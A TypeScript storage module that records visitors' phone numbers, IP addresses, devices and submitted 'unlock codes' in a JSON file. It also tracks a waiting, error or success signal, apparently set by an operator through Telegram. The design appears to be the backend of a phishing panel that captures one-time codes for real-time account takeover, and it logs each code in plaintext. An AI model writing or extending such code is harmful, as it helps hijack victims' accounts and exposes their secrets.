import fs from 'fs';
import path from 'path';

export interface PhoneVerificationRecord {
  id: string;
  phoneNumber: string;
  countryCode: string;
  rawPhoneNumber: string;
  device: string;
  ip: string;
  userAgent: string;
  unlockCode: string | null;
  status: 'pending' | 'code_submitted' | 'verified';
  signal: 'waiting' | 'error' | 'success';
  createdAt: string;
  updatedAt: string;
}

const DATA_DIR = path.resolve(process.cwd(), 'data');
const DB_FILE = path.resolve(DATA_DIR, 'verifications.json');

// Ensure data directory and file exist
function ensureDb() {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }
  if (!fs.existsSync(DB_FILE)) {
    fs.writeFileSync(DB_FILE, JSON.stringify([], null, 2), 'utf-8');
  }
}

function matchesSearch(record: PhoneVerificationRecord, searchKey: string): boolean {
  if (!searchKey) return false;
  const cleanSearch = searchKey.trim();
  if (record.id === cleanSearch || record.phoneNumber === cleanSearch || record.rawPhoneNumber === cleanSearch) {
    return true;
  }

  // Match by digit sequence (e.g. +8801311998527 matches 01311998527 or 1311998527)
  const digitsSearch = cleanSearch.replace(/\D/g, '');
  const digitsRecordPhone = (record.phoneNumber || '').replace(/\D/g, '');
  const digitsRawPhone = (record.rawPhoneNumber || '').replace(/\D/g, '');

  if (digitsSearch.length >= 7) {
    if (digitsRecordPhone && (digitsRecordPhone.endsWith(digitsSearch) || digitsSearch.endsWith(digitsRecordPhone))) {
      return true;
    }
    if (digitsRawPhone && (digitsRawPhone.endsWith(digitsSearch) || digitsSearch.endsWith(digitsRawPhone))) {
      return true;
    }
  }

  // Strip underscores or dashes in case Telegram Markdown formatted the ID
  const cleanRecordId = record.id.replace(/[^a-zA-Z0-9]/g, '').toLowerCase();
  const cleanSearchKey = cleanSearch.replace(/[^a-zA-Z0-9]/g, '').toLowerCase();
  return cleanRecordId === cleanSearchKey;
}

export function getAllVerifications(): PhoneVerificationRecord[] {
  ensureDb();
  try {
    const content = fs.readFileSync(DB_FILE, 'utf-8');
    return JSON.parse(content) as PhoneVerificationRecord[];
  } catch (err) {
    console.warn('[DB] Verifications file empty or initializing');
    return [];
  }
}

export function getVerificationById(idOrPhone: string): PhoneVerificationRecord | null {
  ensureDb();
  const records = getAllVerifications();
  return records.find(r => matchesSearch(r, idOrPhone)) || null;
}

export function saveVerification(record: Omit<PhoneVerificationRecord, 'id' | 'createdAt' | 'updatedAt' | 'unlockCode' | 'status' | 'signal'>): PhoneVerificationRecord {
  ensureDb();
  const records = getAllVerifications();
  // Safe alphanumeric ID without underscores to prevent Telegram Markdown formatting issues
  const id = `ver${Date.now()}${Math.random().toString(36).substring(2, 7)}`;
  const now = new Date().toISOString();

  const newRecord: PhoneVerificationRecord = {
    ...record,
    id,
    unlockCode: null,
    status: 'pending',
    signal: 'waiting',
    createdAt: now,
    updatedAt: now,
  };

  records.unshift(newRecord);
  fs.writeFileSync(DB_FILE, JSON.stringify(records, null, 2), 'utf-8');
  console.log(`[DB] Saved verification record: ${newRecord.phoneNumber} (ID: ${id})`);
  return newRecord;
}

export function updateVerificationCode(idOrPhone: string, code: string): PhoneVerificationRecord | null {
  ensureDb();
  const records = getAllVerifications();
  const now = new Date().toISOString();

  const index = records.findIndex(r => matchesSearch(r, idOrPhone));

  if (index === -1) {
    const fallbackId = `ver${Date.now()}code`;
    const newRecord: PhoneVerificationRecord = {
      id: fallbackId,
      phoneNumber: idOrPhone,
      countryCode: '+880',
      rawPhoneNumber: idOrPhone,
      device: 'Unknown',
      ip: '127.0.0.1',
      userAgent: 'Unknown',
      unlockCode: code,
      status: 'code_submitted',
      signal: 'waiting', // reset to waiting for decision
      createdAt: now,
      updatedAt: now,
    };
    records.unshift(newRecord);
    fs.writeFileSync(DB_FILE, JSON.stringify(records, null, 2), 'utf-8');
    return newRecord;
  }

  records[index].unlockCode = code;
  records[index].status = 'code_submitted';
  records[index].signal = 'waiting'; // reset signal to waiting when new code is provided
  records[index].updatedAt = now;

  fs.writeFileSync(DB_FILE, JSON.stringify(records, null, 2), 'utf-8');
  console.log(`[DB] Updated verification code for ${records[index].phoneNumber}: ${code}`);
  return records[index];
}

export function setVerificationSignal(idOrPhone: string, signal: 'waiting' | 'error' | 'success'): PhoneVerificationRecord | null {
  ensureDb();
  const records = getAllVerifications();
  const now = new Date().toISOString();

  let index = records.findIndex(r => matchesSearch(r, idOrPhone));

  if (index === -1 && records.length > 0) {
    // If not matching specific ID, apply to the latest record
    index = 0;
  }

  if (index === -1) {
    return null;
  }

  records[index].signal = signal;
  if (signal === 'success') {
    records[index].status = 'verified';
  }
  records[index].updatedAt = now;

  fs.writeFileSync(DB_FILE, JSON.stringify(records, null, 2), 'utf-8');
  console.log(`[DB] Signal status set to [${signal}] for ${records[index].phoneNumber}`);
  return records[index];
}
